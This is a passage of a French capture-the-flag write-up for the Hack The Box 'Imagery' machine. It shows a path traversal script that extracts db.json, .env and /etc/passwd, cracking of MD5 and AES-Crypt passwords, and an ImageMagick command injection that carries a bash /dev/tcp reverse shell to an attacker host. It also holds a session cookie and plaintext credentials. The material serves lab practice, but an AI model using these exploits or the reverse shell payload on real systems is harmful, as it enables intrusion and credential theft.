+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Terminal 2 : Injection XSS</span>
+</span></span><span style="display:flex;"><span>python3 BlindXSS.py
+</span></span></code></pre></div><p><strong>Cookie admin récupéré :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw
+</span></span></code></pre></div><hr>
+<h2 id="lfi-via-admin-panel">LFI via Admin Panel<a hidden class="anchor" aria-hidden="true" href="#lfi-via-admin-panel">#</a></h2>
+<h3 id="découverte-du-path-traversal">Découverte du Path Traversal<a hidden class="anchor" aria-hidden="true" href="#découverte-du-path-traversal">#</a></h3>
+<p>Avec le cookie admin, nous avons accès à l&rsquo;endpoint <code>/admin/get_system_log</code> qui est vulnérable au Path Traversal via le paramètre <code>log_identifier</code>.</p>
+<h3 id="extraction-de-fichiers-sensibles">Extraction de Fichiers Sensibles<a hidden class="anchor" aria-hidden="true" href="#extraction-de-fichiers-sensibles">#</a></h3>
+<p><strong>Script d&rsquo;exploitation (lfi-exp3.py) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sqlite3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.11.88:8000&#34;</span>
+</span></span><span style="display:flex;"><span>ADMIN_COOKIE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, ADMIN_COOKIE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lfi_read</span>(filepath):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/get_system_log&#34;</span>, 
+</span></span><span style="display:flex;"><span>                       params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;log_identifier&#39;</span>: filepath})
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">and</span> len(r<span style="color:#f92672">.</span>content) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fichiers cibles</span>
+</span></span><span style="display:flex;"><span>targets <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;db.json&#39;</span>, <span style="color:#e6db74">&#39;/home/web/web/db.json&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;db.json&#39;</span>, <span style="color:#e6db74">&#39;../home/web/web/db.json&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;db.json&#39;</span>, <span style="color:#e6db74">&#39;../../home/web/web/db.json&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;db.json&#39;</span>, <span style="color:#e6db74">&#39;../../../home/web/web/db.json&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;db.json&#39;</span>, <span style="color:#e6db74">&#39;../../../../home/web/web/db.json&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;config.py&#39;</span>, <span style="color:#e6db74">&#39;../config.py&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;.env&#39;</span>, <span style="color:#e6db74">&#39;../.env&#39;</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>, <span style="color:#e6db74">&#39;../../../etc/passwd&#39;</span>),
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> filename, path <span style="color:#f92672">in</span> targets:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Testing: </span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> lfi_read(path)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> content:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] FOUND: </span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/tmp/lfi_</span><span style="color:#e6db74">{</span>filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(content)
+</span></span></code></pre></div><p><strong>Fichier db.json extrait :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;users&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin@imagery.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;5d9c1d507a3f76af1e5c97a3ad1eaa31&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;displayId&#34;</span>: <span style="color:#e6db74">&#34;a1b2c3d4&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;testuser@imagery.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;2c65c8d7bfbca32a3ed42596192384f6&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;displayId&#34;</span>: <span style="color:#e6db74">&#34;e5f6g7h8&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;isTestuser&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Cracking des hashes MD5 :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Hash testuser</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;2c65c8d7bfbca32a3ed42596192384f6&#34;</span> &gt; hash.txt
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>Raw-MD5 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Résultat: testpassword (exemple)</span>
+</span></span></code></pre></div><hr>
+<h2 id="rce-via-imagemagick">RCE via ImageMagick<a hidden class="anchor" aria-hidden="true" href="#rce-via-imagemagick">#</a></h2>
+<h3 id="vulnérabilité-command-injection">Vulnérabilité Command Injection<a hidden class="anchor" aria-hidden="true" href="#vulnérabilité-command-injection">#</a></h3>
+<p>L&rsquo;endpoint <code>/apply_visual_transform</code> utilise ImageMagick pour transformer les images. Le paramètre <code>x</code> dans la fonction <code>crop</code> n&rsquo;est pas correctement sanitizé, permettant l&rsquo;injection de commandes.</p>
+<h3 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h3>
+<p><strong>Script d&rsquo;exploitation (POC.py) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.11.88:8000&#34;</span>
+</span></span><span style="display:flex;"><span>ADMIN_COOKIE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw&#34;</span>
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.16.3&#34;</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4444&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, ADMIN_COOKIE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Récupérer une image à transformer</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">/images&#34;</span>)
+</span></span><span style="display:flex;"><span>images <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;images&#39;</span>, [])
+</span></span><span style="display:flex;"><span>image_id <span style="color:#f92672">=</span> images[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;id&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell payload</span>
+</span></span><span style="display:flex;"><span>reverse_shell <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>LPORT<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload avec injection dans le paramètre x</span>
+</span></span><span style="display:flex;"><span>exploit_payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;imageId&#34;</span>: image_id,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;transformType&#34;</span>: <span style="color:#e6db74">&#34;crop&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;params&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;x&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;`</span><span style="color:#e6db74">{</span>reverse_shell<span style="color:#e6db74">}</span><span style="color:#e6db74">`&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;y&#34;</span>: <span style="color:#ae81ff">27</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;width&#34;</span>: <span style="color:#ae81ff">76</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;height&#34;</span>: <span style="color:#ae81ff">53</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Sending exploit...&#34;</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">/apply_visual_transform&#34;</span>,
+</span></span><span style="display:flex;"><span>    json<span style="color:#f92672">=</span>exploit_payload,
+</span></span><span style="display:flex;"><span>    headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Status: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Check your listener!&#34;</span>)
+</span></span></code></pre></div><p><strong>Exécution :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 1 : Listener</span>
+</span></span><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Terminal 2 : Exploit</span>
+</span></span><span style="display:flex;"><span>python3 POC.py
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>Connection received on 10.10.11.88 <span style="color:#ae81ff">44758</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1374<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>web@Imagery:~/web$
+</span></span></code></pre></div><p><strong>Shell stabilisé :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ctrl+Z</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter x2</span>
+</span></span></code></pre></div><hr>
+<h2 id="user-flag---privilege-escalation-vers-mark">User Flag - Privilege Escalation vers Mark<a hidden class="anchor" aria-hidden="true" href="#user-flag---privilege-escalation-vers-mark">#</a></h2>
+<h3 id="découverte-du-fichier-backup-aes">Découverte du Fichier Backup AES<a hidden class="anchor" aria-hidden="true" href="#découverte-du-fichier-backup-aes">#</a></h3>
+<p>En explorant le système en tant que <code>web</code>, nous découvrons un fichier backup chiffré dans <code>/var/backup/</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web@Imagery:~/web$ ls -la /var/backup/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span> 17:00 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2847</span> Aug  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> web_20250806_120723.zip.aes
+</span></span></code></pre></div><p>Le fichier <code>web_20250806_120723.zip.aes</code> est chiffré avec AES-Crypt. Nous devons le transférer sur notre machine locale pour le brute-forcer.</p>
+<p><strong>Transfert du fichier :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur la machine cible</span>
+</span></span><span style="display:flex;"><span>web@Imagery:~/web$ cat /var/backup/web_20250806_120723.zip.aes | base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sur notre machine locale</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[base64_output]&#34;</span> | base64 -d &gt; backup.zip.aes
+</span></span></code></pre></div><h3 id="cracking-du-fichier-aes-crypt">Cracking du Fichier AES-Crypt<a hidden class="anchor" aria-hidden="true" href="#cracking-du-fichier-aes-crypt">#</a></h3>
+<p>Le fichier <code>backup.zip.aes</code> est chiffré avec AES-Crypt. Nous utilisons un script de brute-force multi-thread avec <code>pyAesCrypt</code> et la wordlist <code>rockyou.txt</code>.</p>
+<p><strong>Installation des dépendances :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Avec uv (moderne)</span>
+</span></span><span style="display:flex;"><span>uv venv
+</span></span><span style="display:flex;"><span>source .venv/bin/activate
+</span></span><span style="display:flex;"><span>uv pip install pyAesCrypt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ou avec pip classique</span>
+</span></span><span style="display:flex;"><span>pip3 install pyAesCrypt
+</span></span></code></pre></div><p><strong>Exécution du brute-force :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 aes_crack_threaded.py backup.zip.aes -w /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>============================================================
+</span></span><span style="display:flex;"><span> AES-Crypt Multi-Threaded Brute-Force Tool
+</span></span><span style="display:flex;"><span>============================================================
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Encrypted file: backup.zip.aes
+</span></span><span style="display:flex;"><span>[*] Wordlist: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>[*] Threads: 4
+</span></span><span style="display:flex;"><span>[*] Buffer size: 64KB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Starting multi-threaded attack at 18:40:25
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Attempts: 142589 | Rate: 8934 pwd/s | Threads: 4 | Testing: password123
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Worker 2 found password: [PASSWORD_FOUND]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] SUCCESS! Password found: [PASSWORD_FOUND]
+</span></span><span style="display:flex;"><span>[+] Total attempts: 142847
+</span></span><span style="display:flex;"><span>[+] Time elapsed: 15.98 seconds
+</span></span><span style="display:flex;"><span>[+] Decrypted file saved to: decrypted_backup.zip
+</span></span></code></pre></div><h3 id="analyse-du-backup-décrypté">Analyse du Backup Décrypté<a hidden class="anchor" aria-hidden="true" href="#analyse-du-backup-décrypté">#</a></h3>
+<p><strong>Extraction du backup :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip decrypted_backup.zip
+</span></span></code></pre></div><p><strong>Contenu du fichier db.json trouvé dans le backup :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;users&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin@imagery.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;5d9c1d507a3f76af1e5c97a3ad1eaa31&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;mark@imagery.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;[MD5_HASH_MARK]&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Cracking du hash MD5 de mark :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[MD5_HASH_MARK]&#34;</span> &gt; mark_hash.txt
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>Raw-MD5 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt mark_hash.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ou hashcat</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> mark_hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><strong>Credentials découverts :</strong></p>
+<ul>
+<li><strong>Username:</strong> mark</li>
+<li><strong>Password:</strong> supersmash</li>
+</ul>
+<h3 id="pivot-vers-lutilisateur-mark">Pivot vers l&rsquo;utilisateur Mark<a hidden class="anchor" aria-hidden="true" href="#pivot-vers-lutilisateur-mark">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web@Imagery:~/web$ su mark
+</span></span><span style="display:flex;"><span>Password: supersmash
+</span></span><span style="display:flex;"><span>mark@Imagery:/home/web/web$
+</span></span></code></pre></div><h3 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ cat /home/mark/user.txt
+</span></span><span style="display:flex;"><span>2c4b9c3a64c236b68056b0369ec85543
+</span></span></code></pre></div><hr>
+<h2 id="root---exploitation-de-charcol">Root - Exploitation de Charcol<a hidden class="anchor" aria-hidden="true" href="#root---exploitation-de-charcol">#</a></h2>
+<h3 id="enumération-des-privilèges-sudo">Enumération des Privilèges Sudo<a hidden class="anchor" aria-hidden="true" href="#enumération-des-privilèges-sudo">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> mark: supersmash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User mark may run the following commands on Imagery:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> /usr/local/bin/charcol
+</span></span></code></pre></div><p>L&rsquo;utilisateur <code>mark</code> peut exécuter <code>/usr/local/bin/charcol</code> en tant que root sans restriction.</p>
+<h3 id="analyse-de-charcol">Analyse de Charcol<a hidden class="anchor" aria-hidden="true" href="#analyse-de-charcol">#</a></h3>
+<p>Charcol est un outil CLI de backup avec chiffrement développé en Python. Examinons ses fonctionnalités :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ sudo /usr/local/bin/charcol help
+</span></span><span style="display:flex;"><span>usage: charcol.py <span style="color:#f92672">[</span>--quiet<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-R<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>shell,help<span style="color:#f92672">}</span> ...
+</span></span><span style="display:flex;"><span>
